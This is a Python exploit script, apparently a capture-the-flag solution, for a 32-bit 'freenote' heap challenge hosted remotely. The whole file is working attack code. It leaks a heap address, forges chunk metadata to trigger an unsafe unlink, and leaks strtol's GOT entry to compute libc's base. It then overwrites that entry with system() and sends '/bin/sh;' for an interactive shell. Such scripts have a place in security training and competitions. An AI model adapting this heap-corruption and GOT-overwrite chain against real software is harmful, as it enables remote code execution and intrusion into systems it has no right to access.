from zio import *

target = "./freenote_x86"
target = ("pwn2.jarvisoj.com", 9885)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return io

def list_note(io):
	io.read_until(": ")
	io.writeline("1")

def new_note(io, length, content):
	io.read_until(": ")
	io.writeline("2")
	io.read_until(": ")
	io.writeline(str(length))
	io.read_until(": ")
	io.write(content)

def edit_note(io, index, length, content):
	io.read_until(": ")
	io.writeline("3")
	io.read_until(": ")
	io.writeline(str(index))
	io.read_until(": ")
	io.writeline(str(length))
	io.read_until(": ")
	io.write(content)

def delete_note(io, index):
	io.read_until(": ")
	io.writeline("4")
	io.read_until(": ")
	io.writeline(str(index))

def pwn(io):
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)

	delete_note(io, 1)
	delete_note(io, 3)
	edit_note(io, 0, 0x8C, "a"*0x8C)
	list_note(io)

	io.read_until("a"*0x8C)
	data = io.read_until("\n")[:-1]
	print [c for c in data]

	heap_addr = l32(data[:4].ljust(4, "\x00"))
	manager_addr = heap_addr-0xdb0 + 0x8
	print "heap_addr:", hex(heap_addr)
	print "manager_addr:", hex(manager_addr)


	#node0 addr set
	node0_addr = manager_addr + 0x8 + 0xC * 0 + 0x8

	#usefull code begin

	bits = 32#64
	if bits == 32:
		p_func = l32
		field_size = 4
	else:
		p_func = l64
		field_size = 8

	p0 = p_func(0x0)
	p1 = p_func(0x81)
	p2 = p_func(node0_addr - 3 * field_size)
	p3 = p_func(node0_addr - 2 * field_size)
	node1_pre_size = p_func(0x80)
	node1_size = p_func(0x80 + 2 * field_size)
	data0 = p0 + p1 + p2 + p3 + "".ljust(0x80 - 4 * field_size, '1') + node1_pre_size + node1_size
	
	#edit node 0, over write node 1
	edit_note(io, 0, len(data0), data0)

	#delete node 1 unlink node 0 
	delete_note(io, 1)
	#usefull code end

	strtol_got                 = 0x0804a2bc          
	offset_strtol              = 0x32bd0             
	strtol_plt                 = 0x080484c0

	offset_system = 0x3e800

	#remote
	offset_strtol              = 0x34640      
	#strtol_plt                   = 0x0000000000400760  
	offset_system = 0x40310

	payload = ""
	payload += l32(0x02)
	payload += l32(0x01)
	payload += l32(0x4)
	payload += l32(strtol_got)

	payload = payload.ljust(0x88, 'a')

	edit_note(io, 0, len(payload), payload)
	list_note(io)

	io.read_until("0. ")
	data = io.read_until("\n")[:-1]

	strtol_addr = l32(data[:4].ljust(4, '\x00'))
	print "strtol_addr:", hex(strtol_addr)

	libc_base = strtol_addr - offset_strtol
	system_addr = libc_base + offset_system
	print "system_addr:", hex(system_addr)

	payload = ""
	payload += l32(system_addr)
	io.gdb_hint()
	edit_note(io, 0, len(payload), payload)

	io.read_until(":")
	io.writeline("/bin/sh;")

	io.interact()

io = get_io(target)
pwn(io)

